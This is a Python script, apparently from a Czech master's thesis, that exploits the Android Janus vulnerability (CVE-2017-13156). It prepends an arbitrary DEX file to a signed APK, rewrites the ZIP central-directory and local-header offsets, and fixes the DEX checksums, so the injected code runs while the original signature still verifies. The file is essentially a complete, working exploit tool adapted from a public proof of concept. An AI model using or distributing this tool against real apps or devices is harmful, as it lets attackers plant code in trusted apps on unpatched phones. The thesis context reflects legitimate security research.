
# Tento kod je soucast diplomove prace "Vyuziti zranitelnosti Janus na operacnim systemu Android"
# Autor: Bc. Vit Soucek
# Pouzite zdroje:
#     - Proof-of-concept vyuziti zranitelnosti Janus:
#         autor: V-E-O
#         dostupne z: https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156
#         Prevzata hlavni myslenka a postup tohoto zdroje. Zdroj neni citovan na konkretnich mistech v kodu,
#         nebot temer cely kod byl pro potreby teto prace upraven a prepsan
#
#     - Specifikace formatu souboru PKZip:
#         autor: Florian Buchholz (buchhofp@jmu.edu)
#         dostupne z: https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html
#         V komentarich v kodu referovana pouze jako "documentation".


import click
import sys
import struct
import hashlib
from zlib import adler32

END_OF_CENTRAL_DIRECTORY_SIGNATURE = b'PK\x05\x06'


def update_checksum(data):
    m = hashlib.sha1()
    m.update(data[32:])
    data[12:12+20] = m.digest()

    v = adler32(buffer(data[12:])) & 0xffffffff
    data[8:12] = struct.pack("<L", v)


def get_central_directory_start(apk_data, cd_end_addr):
    """
    Find the offset of the start of the central directory.
    According to the PKZip specification, the offset is always
    written in the 'End of the central directory' section on offset
    16 to 20.

    :param apk_data: Data of the whole APK file
    :param cd_end_addr: Offset of the 'End of the central directory' section
    :return: Offset of the start of the central directory
    """
    return struct.unpack("<L", apk_data[cd_end_addr+16:cd_end_addr+20])[0]


def get_central_directory_end(apk_data):
    """
    Find the section 'End of the central directory'.
    Use the signature mentioned in the PKZip documentation
    to locate the offset.

    :param apk_data: Data of the APK file
    :return: Offset of the 'End of the central directory' section within the APK
    """
    return apk_data.find(END_OF_CENTRAL_DIRECTORY_SIGNATURE)


def get_local_header_offset(apk_data, pos):
    """
    Find the relative offset of local header. This is the offset
    of where to find the corresponding local file header from
    the start of the first disk.
    According to the documentation, the offset is located
    in each 'File Header' section of the Central Directory
    on offset 0x2A - 0x2D (42 - 46).

    :param apk_data: Data of the whole APK file
    :param pos: Offset in the APK where to start looking for a new 'File Header' section
    :return: Offset of the local header
    """
    return struct.unpack("<L", apk_data[pos + 42:pos + 46])[0]


def update_cd_start_offset(apk_data, cd_end_addr, cd_start_addr, dex_size):
    """
    The central directory gets 'moved'. Update the offset of its start
    -- count in the size of the prepended DEX file.

    :param apk_data: Data of the whole APK file
    :param cd_end_addr: Offset of the 'End of the central directory' section
    :param cd_start_addr: Offset of the start of the central directory
    :param dex_size: Size of the DEX file that is being prepended
    """
    apk_data[cd_end_addr + 16:cd_end_addr + 20] = struct.pack("<L", cd_start_addr+dex_size)


@click.command()
@click.argument('dex', required=True, type=click.File('rb'))
@click.argument('apk', required=True, type=click.File('rb'))
@click.argument('out_apk', required=True)
def main(dex, apk, out_apk):

    dex_data = bytearray(dex.read())
    dex_size = len(dex_data)

    apk_data = bytearray(apk.read())

    cd_end_addr = get_central_directory_end(apk_data)
    cd_start_addr = get_central_directory_start(apk_data, cd_end_addr)

    update_cd_start_offset(apk_data, cd_end_addr, cd_start_addr, dex_size)

    pos = cd_start_addr
    while pos < cd_end_addr:
        local_header_offset = get_local_header_offset(apk_data, pos)
        apk_data[pos+42:pos+46] = struct.pack("<L", local_header_offset+dex_size)
        pos = apk_data.find("\x50\x4b\x01\x02", pos+46, cd_end_addr)
        if pos == -1:
            break

    out_data = dex_data + apk_data
    out_data[32:36] = struct.pack("<L", len(out_data))
    update_checksum(out_data)

    with open(out_apk, "wb") as f:
        f.write(out_data)

    print('%s generated' % out_apk)


if __name__ == '__main__':
    main()
